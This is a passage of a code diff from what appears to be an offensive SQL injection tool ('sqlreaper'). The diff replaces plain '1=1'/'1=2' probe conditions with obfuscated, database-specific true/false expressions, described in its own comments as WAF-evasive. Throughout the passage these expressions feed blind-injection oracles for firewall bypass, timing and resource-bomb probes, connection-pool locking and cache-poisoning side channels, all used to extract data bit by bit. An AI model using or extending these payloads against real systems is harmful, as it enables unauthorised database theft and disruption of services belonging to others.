+            ("LEAST(2e0,3e0)>(0e0)","GREATEST(2e0,3e0)<(0e0)"),
+            ("ABS(-1e0)>(0e0)","ABS(-1e0)<(0e0)"),
+            ("NVL(NULL,1e0)>(0e0)","NVL(NULL,1e0)<(0e0)"),
+            ("MIN(2e0,3e0)>(0e0)","MIN(2e0,3e0)<(0e0)"),
+            ("least(2e0,3e0)>(0e0)","least(2e0,3e0)<(0e0)"),
+            ("1e0<2e0","2e0<1e0"),
+        ]:
             if t in raw:
                 false_payload = det_payload.replace(t, f, 1)
                 break
@@ -146313,7 +147078,17 @@ class CompressionSideChannel:
         raw = unquote(unquote(det))
 
         false_payload = None
-        for t, f in [("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0")]:
+        for t, f in [
+            ("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
+            ("LEAST(2e0,3e0)>(0e0)","GREATEST(2e0,3e0)<(0e0)"),
+            ("ABS(-1e0)>(0e0)","ABS(-1e0)<(0e0)"),
+            ("NVL(NULL,1e0)>(0e0)","NVL(NULL,1e0)<(0e0)"),
+            ("MIN(2e0,3e0)>(0e0)","MIN(2e0,3e0)<(0e0)"),
+            ("least(2e0,3e0)>(0e0)","least(2e0,3e0)<(0e0)"),
+            ("1e0<2e0","2e0<1e0"),
+        ]:
             if t in raw:
                 false_payload = det.replace(t, f, 1)
                 break
@@ -150404,16 +151179,54 @@ class WAFWeaponizationOracle:
         """Test which WAF trigger produces a different response."""
         import asyncio, logging
         _log = logging.getLogger("sqlreaper")
+        _ww_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(dbms or '', "1e0<2e0")
+        _ww_false_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(dbms or '', "2e0<1e0")
         # Send clean baseline
         print("[+] [Novel-1] Sending clean baseline probe...")
-        fp_clean, _ = await send_fn("1=1")
+        fp_clean, _ = await send_fn(_ww_true_cond)
         clean_status = getattr(fp_clean, "status_code", 0)
         await asyncio.sleep(delay)
 
         for idx, trigger in enumerate(cls.WAF_TRIGGERS):
             print("[+] [Novel-1] Testing WAF trigger %d/%d: %s..." % (idx+1, len(cls.WAF_TRIGGERS), trigger[:30]))
             # Build FALSE condition that outputs the trigger
-            payload = cls.build_payload("1=2", dbms, idx)
+            payload = cls.build_payload(_ww_false_cond, dbms, idx)
             fp_trig, _ = await send_fn(payload)
             trig_status = getattr(fp_trig, "status_code", 0)
             await asyncio.sleep(delay)
@@ -150824,7 +151637,46 @@ class NovelWAFBypassExtractor:
                     "DB2":"SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1","Sybase":"SELECT SUSER_NAME()",
                     "CockroachDB":"SELECT current_user"}
 
-        #  Technique 1: WAF Weaponization 
+        _novel_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(dbms, "1e0<2e0")
+        _novel_false_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(dbms, "2e0<1e0")
+
+        #  Technique 1: WAF Weaponization
         print("[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)")
         try:
             cal = await asyncio.wait_for(
@@ -150881,7 +151733,7 @@ class NovelWAFBypassExtractor:
         try:
             # Quick calibration: does micro-sleep produce ANY signal?
             test_result = await asyncio.wait_for(
-                MicroTimingOracle.probe_bit(send_fn, "1=1", dbms, delay_sec=0.05, samples=10, sleep_fn_delay=delay),
+                MicroTimingOracle.probe_bit(send_fn, _novel_true_cond, dbms, delay_sec=0.05, samples=10, sleep_fn_delay=delay),
                 timeout=90)
             if test_result:
                 print("[+] [Novel]  Micro-timing oracle viable (p<0.05)")
@@ -150951,11 +151803,11 @@ class NovelWAFBypassExtractor:
             # the formula contains the unique bomb SQL.
             LOG.info("[Novel-3] Sending resource bomb probe...")
             t0 = time.monotonic()
-            await send_fn(ResourceBombOracle.build_conditional_bomb("1=2", dbms, 3000000))
+            await send_fn(ResourceBombOracle.build_conditional_bomb(_novel_false_cond, dbms, 3000000))
             bomb_time = (time.monotonic() - t0) * 1000
             await asyncio.sleep(delay)
             t0 = time.monotonic()
-            await send_fn(ResourceBombOracle.build_conditional_bomb("1=1", dbms, 3000000))
+            await send_fn(ResourceBombOracle.build_conditional_bomb(_novel_true_cond, dbms, 3000000))
             clean_time = (time.monotonic() - t0) * 1000
             # Sanity-check: if clean_time is suspiciously fast (< 50ms), the result is a
             # CDN cache hit and cannot be used as a timing baseline. Abort in this case.
@@ -151063,9 +151915,9 @@ class NovelWAFBypassExtractor:
         print("[+] [Novel] Technique 5: Connection pool exhaustion oracle")
         try:
             # Send a lock, then check if next request behaves differently
-            await send_fn(ConnectionExhaustionOracle.build_conditional_lock("1=2", dbms, 9999))
+            await send_fn(ConnectionExhaustionOracle.build_conditional_lock(_novel_false_cond, dbms, 9999))
             await asyncio.sleep(delay)
-            fp_after, _ = await send_fn("1=1")
+            fp_after, _ = await send_fn(_novel_true_cond)
             after_status = getattr(fp_after, "status_code", 0)
             # Unlock
             unlock = ConnectionExhaustionOracle.UNLOCK_SQL.get(dbms, "SELECT 1")
@@ -151255,8 +152107,8 @@ class NovelWAFBypassExtractor:
         try:
             # REMOVED: import time as _t11 (unused duplicate)
             # Inflate TRUE, measure content_length difference
-            fp_inflated, _ = await send_fn(TCPSideChannel.build_inflate("1=1", dbms, 50000))
-            fp_normal, _ = await send_fn("1=1")
+            fp_inflated, _ = await send_fn(TCPSideChannel.build_inflate(_novel_true_cond, dbms, 50000))
+            fp_normal, _ = await send_fn(_novel_true_cond)
             inflated_len = getattr(fp_inflated, "content_length", 0)
             normal_len = getattr(fp_normal, "content_length", 0)
             _t11_waf_sc = {400, 403, 406, 429, 430, 503}
@@ -151317,9 +152169,9 @@ class NovelWAFBypassExtractor:
         #  Technique 13: Conditional redirect oracle 
         print("[+] [Novel] Technique 13: Conditional redirect detection")
         try:
-            fp_true, _ = await send_fn(ConditionalRedirectOracle.build_payload("1=1", dbms))
+            fp_true, _ = await send_fn(ConditionalRedirectOracle.build_payload(_novel_true_cond, dbms))
             await asyncio.sleep(delay)
-            fp_false, _ = await send_fn(ConditionalRedirectOracle.build_payload("1=2", dbms))
+            fp_false, _ = await send_fn(ConditionalRedirectOracle.build_payload(_novel_false_cond, dbms))
             true_loc = ""
             false_loc = ""
             for h in ["location", "Location", "LOCATION"]:
@@ -151339,16 +152191,16 @@ class NovelWAFBypassExtractor:
         try:
             # (BUG-V39-BATCH FIX: removed inline `import time as _t14` — use module-level `time`)
             # First request: warm cache with deterministic key
-            await send_fn(CachePoisonOracle.build_payload("1=1", dbms))
+            await send_fn(CachePoisonOracle.build_payload(_novel_true_cond, dbms))
             await asyncio.sleep(delay)
             # Second request: same condition should hit cache (faster)
             t0 = time.monotonic()
-            await send_fn(CachePoisonOracle.build_payload("1=1", dbms))
+            await send_fn(CachePoisonOracle.build_payload(_novel_true_cond, dbms))
             cached_ms = (time.monotonic() - t0) * 1000
             await asyncio.sleep(delay)
             # Third request: different condition = cache miss (slower)
             t0 = time.monotonic()
-            await send_fn(CachePoisonOracle.build_payload("1=2", dbms))
+            await send_fn(CachePoisonOracle.build_payload(_novel_false_cond, dbms))
             miss_ms = (time.monotonic() - t0) * 1000
             margin = miss_ms - cached_ms
             if margin > 30:
@@ -152317,13 +153169,32 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             #     This means ALL conditions return True (WAF blocks everything) →
             #     extraction would produce garbage (all-bits-set → max char value).
             #     ABORT but with a clearer message.
-            # Distinguish A from B by testing the known-always-true condition (1=1):
-            # - If eval_fn("1=1") returns False → oracle is INVERTED (case A) → abort
-            # - If eval_fn("1=1") returns True  → oracle is WAF-LIMITED (case B) → abort
-            # - If eval_fn("1=1") returns None  → WAF blocking all conditions → abort
+            # Distinguish A from B by testing the known-always-true condition (WAF-evasive):
+            # - If eval_fn(evasive_true) returns False → oracle is INVERTED (case A) → wrap
+            # - If eval_fn(evasive_true) returns True  → oracle is WAF-LIMITED (case B) → abort
+            # - If eval_fn(evasive_true) returns None  → WAF blocking all conditions → abort
             # All cases abort extraction, but the log message correctly identifies root cause.
+            _bw_san_true_cond = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                "MSSQL":           "ABS(-1e0)>(0e0)",
+                "Sybase":          "ABS(-1e0)>(0e0)",
+                "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                "DB2":             "ABS(-1e0)>(0e0)",
+                "Firebird":        "ABS(-1e0)>(0e0)",
+                "H2":              "ABS(-1e0)>(0e0)",
+                "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                "Informix":        "ABS(-1e0)>(0e0)",
+                "SAP_HANA":        "ABS(-1e0)>(0e0)",
+            }.get(dbms, "1e0<2e0")
             try:
-                _sanity_true_r = await eval_fn("1=1")
+                _sanity_true_r = await eval_fn(_bw_san_true_cond)
             except Exception:
                 _sanity_true_r = None
             if _sanity_true_r is False:
@@ -152374,20 +153245,39 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         _char_sanity_r = await eval_fn(_char_sanity_cond)
         if _char_sanity_r:
             # Same WAF-limited vs corrupt analysis as the length sanity check above.
+            _bw_char_true_cond = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                "MSSQL":           "ABS(-1e0)>(0e0)",
+                "Sybase":          "ABS(-1e0)>(0e0)",
+                "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                "DB2":             "ABS(-1e0)>(0e0)",
+                "Firebird":        "ABS(-1e0)>(0e0)",
+                "H2":              "ABS(-1e0)>(0e0)",
+                "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                "Informix":        "ABS(-1e0)>(0e0)",
+                "SAP_HANA":        "ABS(-1e0)>(0e0)",
+            }.get(dbms, "1e0<2e0")
             try:
-                _char_sanity_true_r = await eval_fn("1=1")
+                _char_sanity_true_r = await eval_fn(_bw_char_true_cond)
             except Exception:
                 _char_sanity_true_r = None
             if _char_sanity_true_r is False:
                 LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — oracle INVERTED "
-                            "(char always-false→True, 1=1→False); aborting extraction", label)
+                            "(char always-false→True, evasive-true→False); aborting extraction", label)
             elif _char_sanity_true_r is True:
                 LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — WAF-LIMITED "
                             "(WAF blocks all char-function probes, matches true_sig); "
                             "aborting extraction", label)
             else:
                 LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — state unknown "
-                            "(char always-false→True, 1=1→None); aborting extraction", label)
+                            "(char always-false→True, evasive-true→None); aborting extraction", label)
             return ""
     except Exception as _char_sanity_exc:
         LOG.debug("[Novel] %s: char oracle sanity check error (non-fatal): %s",
@@ -165640,10 +166530,49 @@ class ConditionalErrorOracle:
             ("\" AND ", "-- -"),  # double-quote-context (less common)
         ]
 
+        _ceo_cal_dbms = self._dbms or ''
+        _ceo_cal_true = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":          "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":           "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":          "ABS(-1e0)>(0e0)",
+            "Sybase":         "ABS(-1e0)>(0e0)",
+            "DB2":            "ABS(-1e0)>(0e0)",
+            "Firebird":       "ABS(-1e0)>(0e0)",
+            "H2":             "ABS(-1e0)>(0e0)",
+            "Informix":       "ABS(-1e0)>(0e0)",
+            "SAP_HANA":       "ABS(-1e0)>(0e0)",
+            "Oracle":         "NVL(NULL,1e0)>(0e0)",
+            "SQLite":         "MIN(2e0,3e0)>(0e0)",
+            "ClickHouse":     "least(2e0,3e0)>(0e0)",
+        }.get(_ceo_cal_dbms, "1e0<2e0")
+        _ceo_cal_false = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":          "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":        "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":           "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":          "ABS(-1e0)<(0e0)",
+            "Sybase":         "ABS(-1e0)<(0e0)",
+            "DB2":            "ABS(-1e0)<(0e0)",
+            "Firebird":       "ABS(-1e0)<(0e0)",
+            "H2":             "ABS(-1e0)<(0e0)",
+            "Informix":       "ABS(-1e0)<(0e0)",
+            "SAP_HANA":       "ABS(-1e0)<(0e0)",
+            "Oracle":         "NVL(NULL,1e0)<(0e0)",
+            "SQLite":         "MIN(2e0,3e0)<(0e0)",
+            "ClickHouse":     "least(2e0,3e0)<(0e0)",
+        }.get(_ceo_cal_dbms, "2e0<1e0")
         for _prefix, _suffix in _INJECTION_PREFIXES:
             for tpl in templates:
-                _true_payload  = _prefix + tpl.replace("{cond}", "1=1") + _suffix
-                _false_payload = _prefix + tpl.replace("{cond}", "1=2") + _suffix
+                _true_payload  = _prefix + tpl.replace("{cond}", _ceo_cal_true) + _suffix
+                _false_payload = _prefix + tpl.replace("{cond}", _ceo_cal_false) + _suffix
                 try:
                     # BUG-CEO-MUTATION FIX (HIGH): ConditionalErrorOracle calibration
                     # payloads were sent without _bypass_mutation=True.  Inside
